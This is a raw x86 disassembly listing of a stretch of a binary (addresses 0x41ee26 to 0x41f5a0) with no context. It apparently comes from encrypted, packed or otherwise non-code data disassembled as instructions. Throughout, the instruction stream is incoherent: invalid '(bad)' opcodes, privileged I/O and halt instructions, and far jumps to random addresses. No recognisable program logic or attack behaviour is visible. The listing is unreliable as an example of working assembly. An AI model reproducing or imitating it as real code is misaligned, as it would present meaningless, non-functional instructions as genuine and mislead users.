  41ee26:	cwde   
  41ee27:	dec    esp
  41ee28:	icebp  
  41ee29:	sahf   
  41ee2a:	push   eax
  41ee2b:	aad    0x8b
  41ee2d:	cmc    
  41ee2e:	js     0x41eddf
  41ee30:	ja     0x41eea0
  41ee32:	jbe    0x41ee01
  41ee34:	and    edi,DWORD PTR [esp+edx*1+0x9]
  41ee38:	pop    edi
  41ee39:	mov    ebx,0x7a4085a5
  41ee3e:	fidiv  DWORD PTR [ecx]
  41ee40:	int3   
  41ee41:	popw   ds
  41ee43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee44:	std    
  41ee45:	sub    esp,DWORD PTR [edi-0x1efe18d3]
  41ee4b:	test   BYTE PTR [edi+0x65],dl
  41ee4e:	call   0x6a3c767b
  41ee53:	jle    0x41ee89
  41ee55:	jns    0x41ee20
  41ee57:	sub    al,0xb1
  41ee59:	xchg   BYTE PTR [eax-0x57],al
  41ee5c:	cmp    BYTE PTR [ebx+0x42a594e3],ch
  41ee62:	sti    
  41ee63:	add    ah,BYTE PTR [eax+0x1730de60]
  41ee69:	inc    edx
  41ee6a:	popf   
  41ee6b:	(bad)  
  41ee6c:	mov    cs,WORD PTR [ebx]
  41ee6e:	lods   eax,DWORD PTR ds:[esi]
  41ee6f:	jp     0x41ee9e
  41ee71:	int    0x4e
  41ee73:	pop    eax
  41ee74:	ret    
  41ee75:	popa   
  41ee76:	enter  0xe825,0x1c
  41ee7a:	imul   esp,esp,0x7c
  41ee7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee7e:	lds    esp,FWORD PTR [edi]
  41ee80:	je     0x41eec1
  41ee82:	cmp    eax,0x424b98a8
  41ee87:	in     eax,0x32
  41ee89:	cmp    DWORD PTR [ebx+0x282c4de4],0xfffffffc
  41ee90:	loope  0x41eef6
  41ee92:	mov    cl,0xc
  41ee94:	jno    0x41eeaa
  41ee96:	xor    al,0x70
  41ee98:	mov    al,0x5f
  41ee9a:	sti    
  41ee9b:	inc    edx
  41ee9c:	ret    
  41ee9d:	or     ebx,DWORD PTR [edx+0x10]
  41eea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eea1:	sbb    edx,DWORD PTR [edi]
  41eea3:	jecxz  0x41ee5d
  41eea5:	and    ebp,DWORD PTR [edx-0x6e]
  41eea8:	nop
  41eea9:	jno    0x41ee91
  41eeab:	push   ss
  41eeac:	fnstenv [esi-0x4792514]
  41eeb2:	mov    WORD PTR [ebp-0x4785af40],?
  41eeb8:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41eeba:	mov    eax,ds:0x95569bc2
  41eebf:	mov    WORD PTR [ebx+ebx*2],cs
  41eec2:	push   ebx
  41eec3:	add    bh,cl
  41eec5:	lock and BYTE PTR [edi],cl
  41eec8:	and    ebx,DWORD PTR [edx]
  41eeca:	stos   BYTE PTR es:[edi],al
  41eecb:	xlat   BYTE PTR ds:[ebx]
  41eecc:	mov    bl,0x62
  41eece:	int3   
  41eecf:	aad    0x6a
  41eed1:	popa   
  41eed2:	pushf  
  41eed3:	mov    ch,0x19
  41eed5:	test   BYTE PTR [edx-0x7],dl
  41eed8:	int3   
  41eed9:	and    bl,ah
  41eedb:	sahf   
  41eedc:	les    ebx,FWORD PTR [ebp+0x3498d9cc]
  41eee2:	mov    bh,BYTE PTR [edx-0xdc3dd37]
  41eee8:	xlat   BYTE PTR ds:[ebx]
  41eee9:	inc    ebp
  41eeea:	and    bl,BYTE PTR [eax+0x41c697d]
  41eef0:	jg     0x41ee91
  41eef2:	neg    DWORD PTR [edx-0x40]
  41eef5:	dec    eax
  41eef6:	(bad)  
  41eef7:	int3   
  41eef8:	fsub   st,st(5)
  41eefa:	arpl   WORD PTR [ebp+0x1b],bp
  41eefd:	es (bad) 
  41eeff:	fild   WORD PTR [edi-0x5b3b03e1]
  41ef05:	adc    dh,dl
  41ef07:	das    
  41ef08:	fistp  DWORD PTR [ecx]
  41ef0a:	aas    
  41ef0b:	dec    edx
  41ef0c:	mov    BYTE PTR [edi+0x45b7d1ff],dh
  41ef12:	push   cs
  41ef13:	iretw  
  41ef15:	adc    dl,BYTE PTR [ebp+0x4e8c3d34]
  41ef1b:	mov    ebx,0x58c32967
  41ef20:	into   
  41ef21:	jecxz  0x41ef28
  41ef23:	movups XMMWORD PTR [edx],xmm2
  41ef26:	fdivr  st,st(0)
  41ef28:	dec    esi
  41ef29:	rol    BYTE PTR [edi+0x67c70b2e],1
  41ef2f:	hlt    
  41ef30:	pop    esp
  41ef31:	sub    BYTE PTR [edx-0x1063de77],al
  41ef37:	push   0xcbec4603
  41ef3c:	clc    
  41ef3d:	xor    esp,DWORD PTR [edi]
  41ef3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef40:	jnp    0x41eecb
  41ef42:	out    0x35,eax
  41ef44:	loope  0x41efa7
  41ef46:	or     BYTE PTR [ebx+eax*2+0x4a4771c8],0x6
  41ef4e:	leave  
  41ef4f:	std    
  41ef50:	cmp    ebp,DWORD PTR [eax]
  41ef52:	jo     0x41eee0
  41ef54:	fld    DWORD PTR [ecx-0x9]
  41ef57:	fwait
  41ef58:	mov    eax,ds:0xad202cab
  41ef5d:	or     al,0x16
  41ef5f:	add    al,0x5
  41ef61:	adc    eax,0x1096b2a2
  41ef66:	xor    al,0xf3
  41ef68:	jae    0x41ef92
  41ef6a:	adc    al,0xd5
  41ef6c:	xor    al,0x69
  41ef6e:	sub    esp,esi
  41ef70:	pop    esi
  41ef71:	in     al,0x1a
  41ef73:	jbe    0x41ef6e
  41ef75:	adc    BYTE PTR [ebx+0x9c66d3d],0xa1
  41ef7c:	jg     0x41ef51
  41ef7e:	push   ebx
  41ef7f:	push   eax
  41ef80:	adc    al,0x59
  41ef82:	mov    ebp,0x15a8f171
  41ef87:	iret   
  41ef88:	mov    bh,BYTE PTR ds:0xadeae339
  41ef8e:	mov    eax,0x8529c015
  41ef93:	inc    eax
  41ef94:	xor    BYTE PTR [edi],al
  41ef96:	sub    BYTE PTR [esi+0x6c],bl
  41ef99:	loope  0x41effd
  41ef9b:	mov    ebx,0x9c9f1b06
  41efa0:	inc    ebx
  41efa1:	xchg   ecx,eax
  41efa2:	call   0xe7373bfb
  41efa7:	adc    BYTE PTR [eax],ah
  41efa9:	lea    eax,[esi-0x7fedb5fe]
  41efaf:	js     0x41efcf
  41efb1:	out    dx,al
  41efb2:	fst    DWORD PTR [ebx+eax*8-0x50f67a80]
  41efb9:	pop    ecx
  41efba:	mov    eax,0xf23984bf
  41efbf:	jmp    0x56c1:0xa8ecaeae
  41efc6:	dec    eax
  41efc7:	xchg   BYTE PTR [edi+edi*2],dh
  41efca:	xlat   BYTE PTR ds:[ebx]
  41efcb:	fnsave [eax-0x39]
  41efce:	add    eax,0x45f41d13
  41efd3:	arpl   WORD PTR [edi],bx
  41efd5:	jmp    0x8a61574c
  41efda:	outs   dx,DWORD PTR ds:[esi]
  41efdb:	scas   al,BYTE PTR es:[edi]
  41efdc:	out    dx,eax
  41efdd:	fisub  WORD PTR ds:0x487c509b
  41efe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efe4:	lahf   
  41efe5:	mov    ah,0xe9
  41efe7:	pop    esp
  41efe8:	mov    cl,0x7c
  41efea:	enter  0xe0d1,0x33
  41efee:	pushf  
  41efef:	call   0x6885:0xed98
  41eff5:	and    DWORD PTR [edx],ecx
  41eff7:	mov    dl,0x7
  41eff9:	test   al,0x8c
  41effb:	bndstx [edx],bnd3
  41effe:	out    dx,eax
  41efff:	inc    ebp
  41f000:	inc    DWORD PTR [ebp+0x2599c5d1]
  41f006:	xchg   BYTE PTR [eax+ecx*4-0x60],bl
  41f00a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f00b:	add    BYTE PTR [ebx],ah
  41f00d:	repz or BYTE PTR [edx+eiz*8+0x6fd9c1bb],bl
  41f015:	mov    bh,ch
  41f017:	or     DWORD PTR [edx],0x5e
  41f01a:	xor    edi,DWORD PTR [ebp-0x3ab5d025]
  41f020:	or     esi,edx
  41f022:	aaa    
  41f023:	int    0x54
  41f025:	das    
  41f026:	sbb    cl,0xc4
  41f029:	xchg   ebx,eax
  41f02a:	jo     0x41efd3
  41f02c:	pusha  
  41f02d:	cdq    
  41f02e:	retf   0xb31f
  41f031:	cmc    
  41f032:	(bad)  
  41f033:	cs mov eax,0x42bbd360
  41f039:	lods   al,BYTE PTR ds:[esi]
  41f03a:	sub    al,0xb0
  41f03c:	mov    ds:0xedb7252,al
  41f041:	out    0xd0,eax
  41f043:	scas   eax,DWORD PTR es:[edi]
  41f044:	sub    DWORD PTR [edx-0x5b],eax
  41f047:	inc    eax
  41f048:	jns    0x41f05f
  41f04a:	mov    dl,0xfa
  41f04c:	sti    
  41f04d:	add    bh,BYTE PTR [eax]
  41f04f:	push   cs
  41f050:	stc    
  41f051:	das    
  41f052:	ds jmp 0x41f091
  41f055:	adc    ecx,edx
  41f057:	jp     0x41f051
  41f059:	ins    DWORD PTR es:[edi],dx
  41f05a:	mov    al,0x11
  41f05c:	add    DWORD PTR [ebx],ebp
  41f05e:	inc    edi
  41f05f:	jle    0x41f02e
  41f061:	in     al,dx
  41f062:	xchg   BYTE PTR [eax+0x5f],dl
  41f065:	je     0x41f098
  41f067:	arpl   WORD PTR [ebx],bx
  41f069:	fistp  DWORD PTR [ebx+ecx*1]
  41f06c:	mov    ch,0x72
  41f06e:	in     al,dx
  41f06f:	dec    esp
  41f070:	shl    BYTE PTR [edi-0x75e63ce9],0x3e
  41f077:	cmp    edx,DWORD PTR [edx+0x36481429]
  41f07d:	aad    0xd9
  41f07f:	adc    al,0xa
  41f081:	(bad)  
  41f082:	mov    WORD PTR [ebp-0x72e123fc],cs
  41f088:	xchg   edx,eax
  41f089:	es mov ecx,0x67900f94
  41f08f:	fadd   st(4),st
  41f091:	shl    BYTE PTR [esi-0x1a],cl
  41f094:	in     al,0xb
  41f096:	rcr    dh,cl
  41f098:	lods   al,BYTE PTR ds:[esi]
  41f099:	test   al,0x2d
  41f09b:	popa   
  41f09c:	push   ecx
  41f09d:	loopne 0x41f064
  41f09f:	jno    0x41f092
  41f0a1:	call   0x264e4069
  41f0a6:	(bad)  
  41f0a7:	mov    edi,0x1105b6f6
  41f0ac:	dec    edx
  41f0ad:	ins    DWORD PTR es:[edi],dx
  41f0ae:	inc    ebp
  41f0af:	fwait
  41f0b0:	mov    al,0x7f
  41f0b2:	scas   eax,DWORD PTR es:[edi]
  41f0b3:	arpl   WORD PTR [esi],dx
  41f0b5:	add    dl,BYTE PTR [ebx]
  41f0b7:	sbb    eax,0xa00dcaf5
  41f0bc:	aad    0xa3
  41f0be:	sub    eax,0x8bc6b7e4
  41f0c3:	shl    BYTE PTR [ebp-0x74],0xbc
  41f0c7:	aam    0xa6
  41f0c9:	and    al,0x5c
  41f0cc:	mov    bh,0xa7
  41f0ce:	fwait
  41f0cf:	cdq    
  41f0d0:	(bad)  
  41f0d2:	jno    0x41f134
  41f0d4:	and    al,0x1f
  41f0d6:	push   edx
  41f0d7:	daa    
  41f0d8:	xor    al,0xd5
  41f0da:	fadd   DWORD PTR [ebx-0xa059932]
  41f0e0:	push   ecx
  41f0e1:	mov    ah,0xf5
  41f0e3:	(bad)  
  41f0e5:	sbb    esp,esi
  41f0e7:	in     al,0xba
  41f0e9:	sbb    edx,DWORD PTR [edx+0x562d988a]
  41f0ef:	int    0xe8
  41f0f1:	xchg   ecx,eax
  41f0f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0f3:	loopne 0x41f0f7
  41f0f5:	adc    eax,0xc90d2c75
  41f0fa:	push   esi
  41f0fb:	pusha  
  41f0fc:	fsubr  st(1),st
  41f0fe:	pop    ecx
  41f0ff:	mov    esi,0x83d5dc83
  41f104:	scas   eax,DWORD PTR es:[edi]
  41f105:	shl    DWORD PTR [edi+ebx*4-0x6],1
  41f109:	adc    al,BYTE PTR [esi+0x4e]
  41f10c:	xor    ebp,DWORD PTR [eax-0x366b3b10]
  41f112:	jnp    0x41f14f
  41f114:	or     ebx,ebp
  41f116:	sbb    ebx,ebx
  41f118:	adc    eax,ecx
  41f11a:	cwde   
  41f11b:	xor    ch,ah
  41f11d:	mov    ecx,DWORD PTR [eax-0x76]
  41f120:	imul   edi,DWORD PTR [ecx-0x1c],0x599f7d5c
  41f127:	rol    DWORD PTR [esi+ecx*8-0x3b],cl
  41f12b:	imul   ebx,DWORD PTR [edi+0x63],0x10
  41f12f:	test   BYTE PTR [ecx],ch
  41f131:	and    edi,DWORD PTR [eax]
  41f133:	sti    
  41f134:	mov    ebx,DWORD PTR [bp+si+0x6e]
  41f138:	mov    ecx,0x6d4c9bed
  41f13d:	push   ss
  41f13e:	popf   
  41f13f:	rcr    BYTE PTR [edx],0x22
  41f142:	mov    eax,0x83027c83
  41f147:	bound  eax,QWORD PTR [edi-0x7a0d9d2f]
  41f14d:	inc    ecx
  41f14e:	sub    ebp,DWORD PTR [edi]
  41f150:	jmp    0x41f1a4
  41f152:	pop    esp
  41f153:	ret    
  41f154:	dec    edi
  41f155:	(bad)  
  41f156:	out    dx,al
  41f157:	and    bh,BYTE PTR [esi+edi*4]
  41f15a:	jb     0x41f17a
  41f15c:	aam    0xe2
  41f15e:	int3   
  41f15f:	cmp    ebp,edx
  41f161:	and    cl,ah
  41f163:	out    dx,eax
  41f164:	loopne 0x41f1a6
  41f166:	and    eax,0x824d155
  41f16b:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f16d:	inc    edi
  41f16e:	imul   ebx,DWORD PTR [edx+0x6ed9e42c],0x10
  41f175:	jno    0x41f0f8
  41f177:	bound  edx,QWORD PTR [ebx+edi*1-0x71]
  41f17b:	adc    ebx,ebp
  41f17d:	nop
  41f17e:	shl    ebx,cl
  41f180:	mov    ebx,0x9e772a45
  41f185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f186:	pop    es
  41f187:	fs out dx,al
  41f189:	repnz adc DWORD PTR [eax],esp
  41f18c:	add    dl,ch
  41f18e:	cwde   
  41f18f:	xor    dl,bl
  41f191:	sahf   
  41f192:	sbb    al,0x88
  41f194:	dec    edi
  41f195:	sub    ch,BYTE PTR [edx]
  41f197:	outs   dx,BYTE PTR ds:[esi]
  41f198:	or     bh,BYTE PTR [edx-0x26ed190]
  41f19e:	xor    esi,ebp
  41f1a0:	jmp    0x41f203
  41f1a2:	cwde   
  41f1a3:	into   
  41f1a4:	pop    ebx
  41f1a5:	or     DWORD PTR [edx-0x159cd8f8],edx
  41f1ab:	outs   dx,DWORD PTR ds:[esi]
  41f1ac:	nop
  41f1ad:	sbb    dl,BYTE PTR [ecx]
  41f1af:	(bad)  
  41f1b0:	cld    
  41f1b1:	push   edx
  41f1b2:	add    al,0x6a
  41f1b4:	(bad)  [edx+0xe]
  41f1b7:	shr    BYTE PTR [eax+0xf],cl
  41f1ba:	mov    WORD PTR [edx+0x6bf4478c],cs
  41f1c0:	inc    esi
  41f1c1:	loopne 0x41f1e7
  41f1c3:	popf   
  41f1c4:	cmp    BYTE PTR [edx-0x52fe8e9f],0xcb
  41f1cb:	pushf  
  41f1cc:	inc    esp
  41f1cd:	test   DWORD PTR [ebx-0x13],edi
  41f1d0:	cmp    ah,BYTE PTR [eax-0xb]
  41f1d3:	and    al,0xf3
  41f1d5:	loopne 0x41f1d5
  41f1d7:	sbb    BYTE PTR [ebp+edx*4-0x5dc633bd],dh
  41f1de:	(bad)  
  41f1df:	sub    al,BYTE PTR [esi-0x61]
  41f1e2:	mov    al,ds:0xae5d250a
  41f1e7:	mov    dl,0x5e
  41f1e9:	sbb    eax,0xc5c10d
  41f1ee:	rol    BYTE PTR [esi],cl
  41f1f0:	shl    DWORD PTR ds:0x8ffc5509,0xa5
  41f1f7:	mul    DWORD PTR [ecx]
  41f1f9:	cmp    eax,0xf4a2fd2b
  41f1fe:	sub    bh,BYTE PTR [ebx-0x29]
  41f201:	lahf   
  41f202:	mov    bl,0x63
  41f204:	lods   al,BYTE PTR ds:[esi]
  41f205:	in     al,0xd1
  41f207:	aas    
  41f208:	push   ebp
  41f209:	iret   
  41f20a:	cmp    edx,ecx
  41f20c:	ret    0x8424
  41f20f:	out    dx,al
  41f210:	dec    ebx
  41f211:	shl    eax,1
  41f213:	call   0xcd2ac4ab
  41f218:	mov    edx,0x960ad987
  41f21d:	(bad)  
  41f21e:	clc    
  41f21f:	outs   dx,DWORD PTR ds:[esi]
  41f220:	iret   
  41f221:	inc    esi
  41f222:	adc    cl,BYTE PTR [edi]
  41f224:	and    esp,ecx
  41f226:	dec    eax
  41f227:	dec    eax
  41f228:	imul   DWORD PTR [ebx+ecx*1]
  41f22b:	adc    eax,0x70b2bbe2
  41f230:	inc    edi
  41f231:	pop    esp
  41f233:	pusha  
  41f234:	mov    ecx,ds
  41f236:	mov    edx,0xb0f13909
  41f23b:	and    DWORD PTR [ebx],0x10
  41f23e:	cmp    al,0xaf
  41f240:	xchg   ebp,eax
  41f241:	xchg   ecx,eax
  41f242:	mov    edx,0x6aa1cd8f
  41f247:	shr    DWORD PTR ds:0x5d3646eb,cl
  41f24d:	call   0xc042:0xab9017be
  41f254:	and    eax,0x8f54136e
  41f259:	pop    ebx
  41f25a:	add    BYTE PTR es:[edi+eax*1],0x42
  41f25f:	cmp    DWORD PTR [edi],0xe6717bd6
  41f265:	in     al,dx
  41f266:	jp     0x41f262
  41f268:	xor    al,0xd6
  41f26a:	mov    ebx,ds
  41f26c:	out    0x1b,eax
  41f26e:	sub    al,0x64
  41f270:	jmp    0x30c2087f
  41f275:	jmp    0x41f211
  41f277:	rcr    edi,0x5b
  41f27a:	aad    0x59
  41f27c:	div    BYTE PTR [edi-0x3fae7ccc]
  41f282:	sbb    eax,0x78dc2a0f
  41f287:	and    eax,ecx
  41f289:	gs sti 
  41f28b:	in     al,0x5f
  41f28d:	mov    BYTE PTR [edi-0x2914b77c],cl
  41f293:	bsr    ecx,DWORD PTR [ebp-0xa]
  41f297:	imul   edi,eax,0xa1bfd492
  41f29d:	pop    ds
  41f29e:	push   ebx
  41f29f:	add    edx,esi
  41f2a1:	mov    ebp,0xea5393e6
  41f2a6:	mov    ebp,0x25431b22
  41f2ab:	loopne 0x41f248
  41f2ad:	lea    esp,[ebp+0x24]
  41f2b0:	fsubr  st,st(3)
  41f2b2:	sub    BYTE PTR [edi+0x4a],ch
  41f2b5:	xor    eax,0x43953813
  41f2ba:	mov    al,BYTE PTR [edi]
  41f2bc:	xchg   esp,eax
  41f2bd:	dec    esp
  41f2be:	inc    ebp
  41f2bf:	mov    BYTE PTR [ecx-0x3cc67456],dl
  41f2c5:	lock and DWORD PTR [esi-0x68],esp
  41f2c9:	jb     0x41f2e3
  41f2cb:	jmp    0x1929:0x322ecab8
  41f2d2:	stos   BYTE PTR es:[edi],al
  41f2d3:	or     eax,0x16d4729b
  41f2d8:	cld    
  41f2d9:	(bad)  
  41f2da:	pop    edi
  41f2db:	lock jae 0x41f2e4
  41f2de:	dec    ecx
  41f2df:	hlt    
  41f2e0:	in     eax,0xf0
  41f2e2:	je     0x41f360
  41f2e4:	icebp  
  41f2e5:	lods   al,BYTE PTR ds:[esi]
  41f2e6:	pop    eax
  41f2e7:	sbb    cl,al
  41f2e9:	aad    0xa9
  41f2eb:	into   
  41f2ec:	ficomp DWORD PTR ss:[edx-0x315cd5e2]
  41f2f3:	xchg   ebx,eax
  41f2f4:	dec    ebp
  41f2f5:	cmp    edx,esi
  41f2f7:	cmp    al,0xde
  41f2f9:	fild   DWORD PTR [edi+0x73]
  41f2fc:	ror    al,1
  41f2fe:	(bad)  
  41f2ff:	pop    esi
  41f300:	repz popf 
  41f302:	repnz pop eax
  41f304:	repz ret 0x869f
  41f308:	cmp    edx,DWORD PTR ds:0x5fa980
  41f30e:	scas   al,BYTE PTR es:[edi]
  41f30f:	push   esi
  41f310:	(bad)  
  41f311:	jo     0x41f31b
  41f313:	mov    dl,0x7f
  41f315:	call   0x5ca9:0x60e0f6e7
  41f31c:	imul   eax,edi,0xd26f7a6c
  41f322:	add    al,0x94
  41f324:	pushf  
  41f325:	jno    0x41f314
  41f327:	lds    edi,FWORD PTR [ecx-0x55]
  41f32a:	sbb    ebx,DWORD PTR fs:[edi-0x80]
  41f32e:	inc    DWORD PTR [edx]
  41f330:	popf   
  41f331:	(bad)  
  41f332:	in     al,0xdd
  41f334:	fidivr DWORD PTR [ebp+0x54059425]
  41f33a:	pushf  
  41f33b:	or     BYTE PTR [edi+0x73],bl
  41f33e:	push   ebx
  41f33f:	sbb    al,0xb1
  41f341:	sbb    eax,0x8e02733c
  41f346:	xor    ebx,DWORD PTR [ecx+0x7b5e1fe9]
  41f34c:	mov    esi,0x79a3860
  41f351:	and    BYTE PTR [ebx+0xc],dh
  41f354:	add    DWORD PTR [edx-0x1e22b39e],esp
  41f35a:	jns    0x41f345
  41f35c:	ror    BYTE PTR [ebx-0x69030650],cl
  41f362:	js     0x41f351
  41f364:	xchg   DWORD PTR [ebp+0x2999e51],ebp
  41f36a:	xchg   DWORD PTR [eax+ebx*1],ebp
  41f36d:	dec    esi
  41f36e:	jae    0x41f31a
  41f370:	inc    edx
  41f371:	xchg   ecx,eax
  41f372:	mov    bl,0xd8
  41f374:	nop
  41f375:	scas   eax,DWORD PTR es:[edi]
  41f376:	out    0x5d,eax
  41f378:	xor    eax,0x46a14538
  41f37d:	(bad)  
  41f37e:	test   al,0x4e
  41f380:	xchg   BYTE PTR [edi+0x2],al
  41f383:	loope  0x41f342
  41f385:	xor    DWORD PTR [ecx],ebp
  41f387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f388:	retf   
  41f389:	xor    DWORD PTR [edx+0x23],ecx
  41f38c:	pop    ebx
  41f38d:	adc    BYTE PTR [edx-0x31902c87],al
  41f393:	bound  esp,QWORD PTR [edx+0x530d375c]
  41f399:	pop    ecx
  41f39a:	stos   DWORD PTR es:[edi],eax
  41f39b:	(bad)  
  41f39c:	xor    eax,0x7f70ff71
  41f3a1:	and    ch,BYTE PTR [ebp+0x3a53725e]
  41f3a7:	pop    ds
  41f3a8:	cli    
  41f3a9:	mov    bl,0x60
  41f3ab:	loop   0x41f3eb
  41f3ad:	jnp    0x41f3c0
  41f3af:	cmc    
  41f3b0:	jb     0x41f35a
  41f3b2:	and    eax,0xa272f53e
  41f3b7:	cdq    
  41f3b8:	ds mov cl,0x45
  41f3bb:	inc    esp
  41f3bc:	sbb    eax,0x68210936
  41f3c1:	mov    edx,0xd0722230
  41f3c6:	adc    DWORD PTR [ebp+0x60a5479],edi
  41f3cc:	loop   0x41f3af
  41f3ce:	retw   0xcf22
  41f3d2:	(bad)  
  41f3d4:	push   es
  41f3d5:	add    ah,al
  41f3d7:	adc    bl,BYTE PTR [edi-0x75]
  41f3da:	(bad)  
  41f3db:	shl    ebp,cl
  41f3dd:	shl    BYTE PTR [ecx-0x7b],1
  41f3e0:	out    0xfb,eax
  41f3e2:	dec    ebp
  41f3e3:	inc    edi
  41f3e4:	lds    ebx,FWORD PTR [edx-0x1cc9dc00]
  41f3ea:	call   0xec592c11
  41f3ef:	and    eax,0xd0549ba3
  41f3f4:	add    BYTE PTR [ebx+ebx*8],dl
  41f3f7:	xor    edx,ebp
  41f3f9:	shr    DWORD PTR ds:0xe6387941,1
  41f3ff:	push   esi
  41f400:	or     BYTE PTR [ebx],bh
  41f402:	outs   dx,BYTE PTR ds:[esi]
  41f403:	push   edx
  41f404:	xor    DWORD PTR [edi-0x2b8fc81c],0x5f
  41f40b:	inc    ebx
  41f40c:	xchg   ecx,eax
  41f40d:	or     BYTE PTR [eax],bh
  41f40f:	mov    al,ds:0x840791d0
  41f414:	test   al,0x68
  41f416:	out    0xd6,al
  41f418:	sub    eax,0x65622b8e
  41f41d:	in     al,dx
  41f41e:	lds    edi,FWORD PTR gs:[edi]
  41f421:	pop    ebp
  41f422:	sahf   
  41f423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f424:	mov    esp,0x230eaab
  41f429:	adc    DWORD PTR [eax+0x61deb6b2],edx
  41f42f:	jne    0x41f3b4
  41f431:	push   ebp
  41f432:	outs   dx,BYTE PTR ds:[esi]
  41f433:	iret   
  41f434:	xor    al,ah
  41f436:	push   eax
  41f437:	arpl   WORD PTR [ebx-0x15],bx
  41f43a:	sub    DWORD PTR [edi+ecx*1-0x26064e53],esp
  41f441:	jl     0x41f439
  41f443:	scas   eax,DWORD PTR es:[edi]
  41f444:	stc    
  41f445:	dec    edi
  41f446:	les    edx,FWORD PTR [edx-0x55793092]
  41f44c:	push   ds
  41f44d:	push   0xffffffd7
  41f44f:	mov    dl,0x34
  41f451:	jp     0x41f3f7
  41f453:	cdq    
  41f454:	(bad)  
  41f455:	ret    0x4d13
  41f458:	jne    0x41f4ae
  41f45a:	push   0x28
  41f45c:	mov    al,0xea
  41f45e:	test   bh,al
  41f460:	xchg   ecx,eax
  41f461:	push   0xffffffae
  41f463:	sbb    ebp,DWORD PTR [ecx]
  41f465:	imul   esi,esp,0xffffffa3
  41f468:	ins    DWORD PTR es:[edi],dx
  41f469:	mov    cl,0x17
  41f46b:	inc    ebx
  41f46c:	mov    ds:0xb212dd09,eax
  41f471:	cmp    eax,0x9f4eb072
  41f476:	fst    DWORD PTR [edi-0x39005834]
  41f47c:	test   BYTE PTR [ebp+0x2],0x24
  41f480:	fnstsw WORD PTR [ecx+0x6860e3a0]
  41f486:	pop    ecx
  41f487:	dec    ebp
  41f488:	ficom  DWORD PTR [eax-0x3879bbed]
  41f48e:	popa   
  41f48f:	adc    al,0x36
  41f491:	lods   eax,DWORD PTR ds:[esi]
  41f492:	xchg   ecx,eax
  41f493:	scas   eax,DWORD PTR es:[edi]
  41f494:	dec    esp
  41f495:	sub    esi,ebx
  41f497:	or     DWORD PTR [edi-0x5e],eax
  41f49a:	jmp    0x719c8390
  41f49f:	jle    0x41f4a1
  41f4a1:	and    DWORD PTR [esi+0x75b298af],edx
  41f4a7:	xor    eax,0x8e52eac8
  41f4ac:	retf   
  41f4ad:	int    0x6c
  41f4af:	jmp    0x41f4b3
  41f4b1:	aam    0x64
  41f4b3:	pop    edi
  41f4b4:	fnstsw WORD PTR [ebp+0x51]
  41f4b7:	std    
  41f4b8:	pop    ecx
  41f4b9:	add    dl,BYTE PTR [esi+eax*1+0x41]
  41f4bd:	out    0xb0,eax
  41f4bf:	mov    esp,0x3f0f5201
  41f4c4:	popf   
  41f4c5:	inc    esp
  41f4c6:	xchg   esp,eax
  41f4c7:	enter  0x1244,0x87
  41f4cb:	jae    0x41f47f
  41f4cd:	or     al,0x1f
  41f4cf:	sub    al,ah
  41f4d1:	pop    eax
  41f4d2:	lds    esp,FWORD PTR [esp+esi*8+0x6e]
  41f4d6:	aam    0x18
  41f4d8:	stc    
  41f4d9:	fs int 0xf7
  41f4dc:	add    eax,0x821931c7
  41f4e1:	and    ecx,edi
  41f4e3:	pop    ds
  41f4e4:	mov    eax,ds:0x3e436112
  41f4e9:	aaa    
  41f4ea:	jnp    0x41f550
  41f4ec:	mov    eax,0x66891a4a
  41f4f1:	jb     0x41f4a7
  41f4f3:	jbe    0x41f4db
  41f4f5:	nop
  41f4f6:	mov    ecx,DWORD PTR [ecx+0x6b8818c7]
  41f4fc:	xor    edi,DWORD PTR [ecx+0x2b]
  41f4ff:	out    0x97,eax
  41f501:	sbb    BYTE PTR [esi+0x61],ch
  41f504:	pusha  
  41f505:	iret   
  41f506:	jl     0x41f4e8
  41f508:	jno    0x41f53b
  41f50a:	adc    al,0x78
  41f50c:	cmp    DWORD PTR es:[eax+esi*1-0x3d8f8032],ebp
  41f514:	and    eax,0x1639d2ef
  41f519:	sub    esp,DWORD PTR [esi-0x454c61af]
  41f51f:	mov    dl,dh
  41f521:	mov    ds:0x2fdd2042,al
  41f526:	bound  ebx,QWORD PTR [esi+0x650f86f3]
  41f52c:	ja     0x41f52b
  41f52e:	call   0xcfb0:0x26df855d
  41f535:	(bad)  
  41f536:	dec    eax
  41f537:	mov    esp,0x41c4ff0b
  41f53c:	xor    BYTE PTR [ebp+0x37],ah
  41f53f:	nop
  41f540:	sub    eax,eax
  41f542:	jmp    0x42a0:0x9adc6b03
  41f549:	xor    edi,DWORD PTR [edi+0x173326d3]
  41f54f:	jecxz  0x41f4ff
  41f551:	sbb    dh,bl
  41f553:	xchg   ebp,eax
  41f554:	(bad)  
  41f555:	call   0xae0e3207
  41f55a:	xchg   ecx,eax
  41f55b:	rol    DWORD PTR [ecx-0x7f],cl
  41f55e:	pop    esi
  41f55f:	scas   al,BYTE PTR es:[edi]
  41f560:	xor    dl,BYTE PTR [eax+esi*2-0x7]
  41f564:	pop    esi
  41f565:	push   edx
  41f566:	lock push 0x38
  41f569:	fld    QWORD PTR [edx+eiz*2-0x4e]
  41f56d:	jbe    0x41f57f
  41f56f:	jmp    0x721c:0xfa0e0ce2
  41f576:	das    
  41f577:	sub    al,0xf2
  41f579:	inc    edx
  41f57a:	mov    bl,0x9a
  41f57c:	rcr    BYTE PTR [esi-0x6c],cl
  41f57f:	adc    BYTE PTR [esi+edi*4+0x1c],ch
  41f583:	jg     0x41f5db
  41f585:	mov    BYTE PTR [eax+0x41a98ea],ah
  41f58b:	inc    esp
  41f58c:	aam    0x8e
  41f58e:	ins    DWORD PTR es:[edi],dx
  41f58f:	fs push ebx
  41f591:	das    
  41f592:	jae    0x41f516
  41f594:	inc    ebp
  41f595:	dec    edi
  41f596:	fstp   TBYTE PTR [ecx+0x63783525]
  41f59c:	sbb    al,0x52
  41f59e:	int    0x66
  41f5a0:	pop    ds
